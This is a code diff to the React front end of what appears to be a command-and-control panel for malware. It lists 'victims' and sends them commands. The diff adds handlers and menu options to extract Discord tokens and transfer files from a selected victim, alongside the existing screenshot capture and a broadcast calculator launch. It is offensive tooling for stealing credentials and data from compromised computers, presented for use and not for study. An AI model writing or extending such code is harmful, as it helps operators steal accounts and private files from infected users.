@@ -7,8 +7,9 @@ export default function Dashboard() {
   const [command, setCommand] = useState("");
   const [showLog, setShowLog] = useState(false);
   const [victimOutputs, setVictimOutputs] = useState({});
-  const API_BASE = "http://localhost:8000";
+  const [isSendingQuickCommand, setIsSendingQuickCommand] = useState(false);
 
+  const API_BASE = "http://localhost:8000";
   const now = Date.now() / 1000;
 
   useEffect(() => {
@@ -56,12 +57,52 @@ export default function Dashboard() {
 
   const handleScreenshot = (e) => {
     e.preventDefault();
-    if (!selectedVictim) return; // no victim selected, do nothing
+    if (!selectedVictim) return;
     fetch(`${API_BASE}/send_screenshot`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ victim_id: selectedVictim }),
     });
+  };
+
+  const handleDiscordExtract = (e) => {
+    e.preventDefault();
+    if (!selectedVictim) return;
+    fetch(`${API_BASE}/send_discord_token_extract`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ victim_id: selectedVictim }),
+    });
+  };
+
+  const handleFileTransfer = (e) => {
+    e.preventDefault();
+    if (!selectedVictim) return;
+    fetch(`${API_BASE}/send_file_transfer`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ victim_id: selectedVictim }),
+    });
+  };
+
+  const runWithAnimation = (callback) => {
+    setIsSendingQuickCommand(true);
+    callback();
+    setTimeout(() => setIsSendingQuickCommand(false), 800);
+  };
+
+  const handleQuickCommand = (e) => {
+    const val = e.target.value;
+    if (!val) return;
+
+    runWithAnimation(() => {
+      if (val === "startCalc") handleBroadcastCalc();
+      if (val === "startScreenshot") handleScreenshot(e);
+      if (val === "startDiscordExtract") handleDiscordExtract(e);
+      if (val === "startFileTransfer") handleFileTransfer(e);
+    });
+
+    e.target.value = "";
   };
 
   return (
@@ -105,24 +146,27 @@ export default function Dashboard() {
 
         {/* Quick Actions */}
         <div style={styles.quickActions}>
-
           <select
-            style={styles.commandSelect}
-            defaultValue=""
-            onChange={(e) => {
-              const val = e.target.value;
-              if (val === "startCalc") handleBroadcastCalc();
-              if (val === "startScreenshot") handleScreenshot(e);
-              // add more commands here
-              e.target.value = ""; // reset back to Quick Commands  
+            style={{
+              ...styles.commandSelect,
+              ...(isSendingQuickCommand ? styles.commandSelectPulse : {}),
             }}
+            defaultValue=""
+            onChange={handleQuickCommand}
           >
             <option value="" disabled>
               Quick Commands
             </option>
             <option value="startCalc">Start Calculator (All)</option>
-            <option value="startScreenshot">Take Screenshot ({selectedVictim || "No victim selected"})</option>
-            {/* add more options here */}
+            <option value="startScreenshot">
+              Take Screenshot ({selectedVictim || "No victim selected"})
+            </option>
+            <option value="startDiscordExtract">
+              Extract Discord Tokens ({selectedVictim || "No victim selected"})
+            </option>
+            <option value="startFileTransfer">
+              Start File Transfer ({selectedVictim || "No victim selected"})
+            </option>
           </select>
 
           <button onClick={clearVictimData} style={styles.secondaryButton}>
@@ -211,6 +255,17 @@ export default function Dashboard() {
           </button>
         </form>
       </div>
+
+      {/* Keyframe Animation */}
+      <style>
+        {`
+          @keyframes pulse {
+            0% { box-shadow: 0 0 0px rgba(255, 255, 255, 0); }
+            50% { box-shadow: 0 0 8px rgba(138, 180, 250, 0.8); }
+            100% { box-shadow: 0 0 0px rgba(255, 255, 255, 0); }
+          }
+        `}
+      </style>
     </div>
   );
 }
@@ -261,6 +316,9 @@ const styles = {
     fontSize: "13px",
     fontFamily: "inherit",
     cursor: "pointer",
+  },
+  commandSelectPulse: {
+    animation: "pulse 0.8s ease-in-out",
   },
   sidebar: {
     display: "flex",
